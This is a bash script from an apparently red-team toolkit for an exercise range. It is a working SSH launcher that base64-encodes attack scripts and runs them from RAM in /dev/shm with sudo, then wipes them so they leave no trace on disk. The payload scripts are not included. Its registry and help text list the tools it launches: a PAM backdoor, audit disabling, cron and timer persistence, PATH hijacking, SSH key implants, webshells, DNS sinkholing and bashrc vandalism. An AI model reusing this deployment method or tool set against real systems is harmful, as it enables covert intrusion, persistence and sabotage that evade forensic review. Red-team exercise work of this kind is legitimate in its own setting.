#!/usr/bin/env bash
# rt-ssh.sh — SSH deployment wrapper for the red team toolkit
#
# Sends tool scripts to target over SSH without leaving source on disk.
# Method: base64-encode script on Kali → SSH → decode into /dev/shm (RAM tmpfs)
#         → execute → wipe.  Source code never touches the target filesystem.
#
# Usage:
#   ./rt-ssh.sh [OPTIONS] <tool> [tool-args...]
#
# Connection options:
#   -t, --target USER@HOST   SSH target (required for remote tools)
#   -p, --pass PASS          SSH login password (uses sshpass); also used as
#                            sudo password unless -S overrides it
#   -i, --identity FILE      SSH private key file
#   -P, --port PORT          SSH port (default: 22)
#   -S, --sudo-pass PASS     Sudo password (overrides -p for sudo only)
#       --no-sudo            Don't prepend sudo (already SSH'd in as root)
#
# Other:
#       --list               List all tools and exit
#   -v, --verbose            Show the remote command before running
#   -h, --help               Show this help
#
# ── REMOTE tools (piped to target, never written to disk) ──────────────────────
#   shadow-crond          install|remove|status
#   flood-journal         install|remove|status
#   ureadahead-persist    install|remove|status [--key "ssh-ed25519 ..."]
#   lock-busybox          install|remove|status
#   poison-timer          install|remove|status
#   evil-timer            install|remove|status   (user-level, no sudo needed)
#   no-apt                install|remove|status
#   no-audit              (one-shot, no subcommand)
#   break-net-tools       install|remove|status
#   pam-backdoor          install|remove|status
#   sinkhole              install|remove|status
#   pihole-sinkhole       install|remove|status
#   compromise-who        install|remove
#   infinite-users        (one-shot)
#   sudo-binary           (one-shot)
#   vandalize-bashrc      (one-shot)
#   the-toucher           (one-shot, starts background loop)
#   alias-bashrc          install|remove
#   vim-persist           install|remove
#   path-hijack           scan|install [--level system|cron] [--key "..."] [--commands "..."] [--payload 1|2|3]
#   path-hijack-user      scan|install [--level user]        [--key "..."] [--commands "..."]
#
# ── LOCAL tools (run on Kali, target the host themselves via SSH/HTTP/etc.) ────
#   linux-persist    <target_ip> <user> <pass> [lhost] [lport]
#   redis-persist    <target_ip> [port]
#   ad-persist       <target_ip> <domain_admin> <pass>
#   lamp-shell       [options]   (targets svc-samba-01 over HTTP/SMB)
#   nginx-flask      [options]   (targets svc-redis-01 over HTTP)
# ──────────────────────────────────────────────────────────────────────────────

set -euo pipefail

RT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ── colours ───────────────────────────────────────────────────────────────────
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'
info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
err()   { echo -e "${RED}[!]${NC} $*" >&2; }
hdr()   { echo -e "\n${CYAN}── $* ──${NC}"; }

# ── tool registry ─────────────────────────────────────────────────────────────
# Value format:
#   REMOTE:<path>          — pipe to target via SSH (needs root/sudo)
#   REMOTE_USER:<path>     — pipe to target via SSH (runs as the SSH user, no sudo)
#   LOCAL:<path>           — run on Kali; passes all remaining args straight through

declare -A TOOLS=(
    # remote — need root on target
    [shadow-crond]="REMOTE:shadow-crond.sh"
    [flood-journal]="REMOTE:flood-journal.sh"
    [ureadahead-persist]="REMOTE:ureadahead-persist.sh"
    [lock-busybox]="REMOTE:lock-busybox.sh"
    [poison-timer]="REMOTE:evil-timer/poison-timer.sh"
    [no-apt]="REMOTE:no-apt.sh"
    [no-audit]="REMOTE:no-audit.sh"
    [break-net-tools]="REMOTE:break-net-tools.sh"
    [pam-backdoor]="REMOTE:pam-backdoor/deploy-pam-backdoor.sh"
    [sinkhole]="REMOTE:sinkhole-scripts.sh"
    [pihole-sinkhole]="REMOTE:pihole-github-sinkhole.sh"
    [compromise-who]="REMOTE:compromise-w-who.sh"
    [infinite-users]="REMOTE:infinite-users.sh"
    [sudo-binary]="REMOTE:sudo-biNOry.sh"
    [vandalize-bashrc]="REMOTE:vandalize-bashrc.sh"
    [the-toucher]="REMOTE:the-toucher.sh"
    [alias-bashrc]="REMOTE:alias-bashrc.sh"
    [vim-persist]="REMOTE:vim-persist.sh"
    [path-hijack]="REMOTE:path-hijack.sh"
    # remote — runs as SSH user (no sudo); user-level systemd units / user PATH
    [evil-timer]="REMOTE_USER:evil-timer/deploy-evil-timer.sh"
    [path-hijack-user]="REMOTE_USER:path-hijack.sh"
    # local — runs on Kali, manages target directly
    [linux-persist]="LOCAL:persist/linux_persist.sh"
    [redis-persist]="LOCAL:persist/redis_persist.sh"
    [ad-persist]="LOCAL:persist/ad_persist.sh"
    [lamp-shell]="LOCAL:webshells/deploy_lamp_shell.sh"
    [nginx-flask]="LOCAL:webshells/deploy_nginx_flask_shell.sh"
)

# ── argument parsing ──────────────────────────────────────────────────────────
TARGET=""
SSH_KEY=""
SSH_PORT="22"
SSH_PASS=""
SUDO_PASS=""
USE_SUDO=1
VERBOSE=0

usage() {
    sed -n '/^# Usage:/,/^[^#]/{ /^#/{ s/^# \?//; p }; /^[^#]/q }' "$0"
    exit "${1:-0}"
}

list_tools() {
    hdr "Remote tools (piped to target)"
    for t in "${!TOOLS[@]}"; do
        [[ "${TOOLS[$t]}" == REMOTE:* || "${TOOLS[$t]}" == REMOTE_USER:* ]] \
            && printf "  %-22s %s\n" "$t" "${TOOLS[$t]#*:}"
    done | sort

    hdr "Local tools (run on Kali)"
    for t in "${!TOOLS[@]}"; do
        [[ "${TOOLS[$t]}" == LOCAL:* ]] \
            && printf "  %-22s %s\n" "$t" "${TOOLS[$t]#*:}"
    done | sort
    echo
}

POSITIONAL=()
while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--target)    TARGET="$2";    shift 2 ;;
        -p|--pass)      SSH_PASS="$2";  shift 2 ;;
        -i|--identity)  SSH_KEY="$2";   shift 2 ;;
        -P|--port)      SSH_PORT="$2";  shift 2 ;;
        -S|--sudo-pass) SUDO_PASS="$2"; shift 2 ;;
        --no-sudo)      USE_SUDO=0;     shift   ;;
        --list)         list_tools; exit 0       ;;
        -v|--verbose)   VERBOSE=1;      shift   ;;
        -h|--help)      usage 0                  ;;
        --) shift; POSITIONAL+=("$@"); break     ;;
        # unknown flag: if we already have the tool name, it belongs to the tool
        -*) [[ ${#POSITIONAL[@]} -gt 0 ]] \
                && POSITIONAL+=("$1") \
                || { err "Unknown option: $1"; usage 1; }
            shift ;;
        *)  POSITIONAL+=("$1"); shift            ;;
    esac
done
set -- "${POSITIONAL[@]+"${POSITIONAL[@]}"}"

[[ $# -lt 1 ]] && { err "No tool specified."; usage 1; }

TOOL="$1"; shift
TOOL_ARGS=("$@")

# ── resolve tool ──────────────────────────────────────────────────────────────
if [[ -z "${TOOLS[$TOOL]+x}" ]]; then
    err "Unknown tool: '$TOOL'  (run --list to see available tools)"
    exit 1
fi

IFS=: read -r MODE REL_PATH <<< "${TOOLS[$TOOL]}"
SCRIPT="${RT_DIR}/${REL_PATH}"

if [[ ! -f "$SCRIPT" ]]; then
    err "Script not found: $SCRIPT"
    exit 1
fi

# ── local tools: just run them ────────────────────────────────────────────────
if [[ "$MODE" == "LOCAL" ]]; then
    info "Running locally: $SCRIPT ${TOOL_ARGS[*]+"${TOOL_ARGS[*]}"}"
    exec bash "$SCRIPT" "${TOOL_ARGS[@]+"${TOOL_ARGS[@]}"}"
fi

# ── remote tools: need a target ───────────────────────────────────────────────
if [[ -z "$TARGET" ]]; then
    err "Remote tool '$TOOL' requires -t user@host"
    usage 1
fi

# ── build SSH command array ───────────────────────────────────────────────────
SSH_OPTS=(
    -o StrictHostKeyChecking=no
    -o ConnectTimeout=10
    -p "$SSH_PORT"
)
if [[ -n "$SSH_KEY" ]]; then
    SSH_OPTS+=(-i "$SSH_KEY")
elif [[ -n "$SSH_PASS" ]]; then
    # password auth — force it so we don't wait on key negotiation
    SSH_OPTS+=(
        -o PreferredAuthentications=password
        -o PubkeyAuthentication=no
        -o BatchMode=no
    )
else
    SSH_OPTS+=(-o BatchMode=no)
fi

# -p sets sudo password too unless -S was explicitly given
[[ -n "$SSH_PASS" && -z "$SUDO_PASS" ]] && SUDO_PASS="$SSH_PASS"

# ── base64-encode the script (avoids quoting issues, no file on disk) ─────────
B64=$(base64 -w0 < "$SCRIPT")

# ── build the remote command ──────────────────────────────────────────────────
# Steps on target:
#   1. mktemp in /dev/shm  (RAM tmpfs, never written to actual disk)
#   2. base64 -d into it
#   3. chmod 700 and execute (with or without sudo)
#   4. rm immediately, even if script fails

TOOL_ARGS_QUOTED=""
if [[ ${#TOOL_ARGS[@]} -gt 0 ]]; then
    # safely quote each arg for embedding in the remote shell string
    for a in "${TOOL_ARGS[@]}"; do
        TOOL_ARGS_QUOTED+=" $(printf '%q' "$a")"
    done
fi

if [[ "$MODE" == "REMOTE_USER" ]]; then
    # no sudo — runs as the SSH user (for user-level systemd units etc.)
    REMOTE_CMD="
_t=\$(mktemp /dev/shm/.XXXXXXXXXXXXXXXX)
printf '%s' '${B64}' | base64 -d > \"\$_t\"
chmod 700 \"\$_t\"
bash \"\$_t\"${TOOL_ARGS_QUOTED}
_rc=\$?
rm -f \"\$_t\"
exit \$_rc
"
elif [[ $USE_SUDO -eq 0 ]]; then
    # already root — no sudo needed
    REMOTE_CMD="
_t=\$(mktemp /dev/shm/.XXXXXXXXXXXXXXXX)
printf '%s' '${B64}' | base64 -d > \"\$_t\"
chmod 700 \"\$_t\"
bash \"\$_t\"${TOOL_ARGS_QUOTED}
_rc=\$?
rm -f \"\$_t\"
exit \$_rc
"
elif [[ -n "$SUDO_PASS" ]]; then
    # sudo with password
    REMOTE_CMD="
_t=\$(mktemp /dev/shm/.XXXXXXXXXXXXXXXX)
printf '%s' '${B64}' | base64 -d > \"\$_t\"
chmod 700 \"\$_t\"
printf '%s\n' '$(printf '%q' "$SUDO_PASS")' | sudo -S bash \"\$_t\"${TOOL_ARGS_QUOTED}
_rc=\$?
rm -f \"\$_t\"
exit \$_rc
"
else
    # sudo without password (NOPASSWD sudoers or root SSH)
    REMOTE_CMD="
_t=\$(mktemp /dev/shm/.XXXXXXXXXXXXXXXX)
printf '%s' '${B64}' | base64 -d > \"\$_t\"
chmod 700 \"\$_t\"
sudo bash \"\$_t\"${TOOL_ARGS_QUOTED}
_rc=\$?
rm -f \"\$_t\"
exit \$_rc
"
fi

# ── execute ───────────────────────────────────────────────────────────────────
info "Target:  $TARGET"
info "Tool:    $TOOL  ($REL_PATH)"
[[ ${#TOOL_ARGS[@]} -gt 0 ]] && info "Args:    ${TOOL_ARGS[*]}"
[[ $VERBOSE -eq 1 ]]         && hdr "Remote command" && echo "$REMOTE_CMD"
echo

if [[ -n "$SSH_PASS" ]]; then
    sshpass -p "$SSH_PASS" ssh "${SSH_OPTS[@]}" "$TARGET" "$REMOTE_CMD"
else
    ssh "${SSH_OPTS[@]}" "$TARGET" "$REMOTE_CMD"
fi
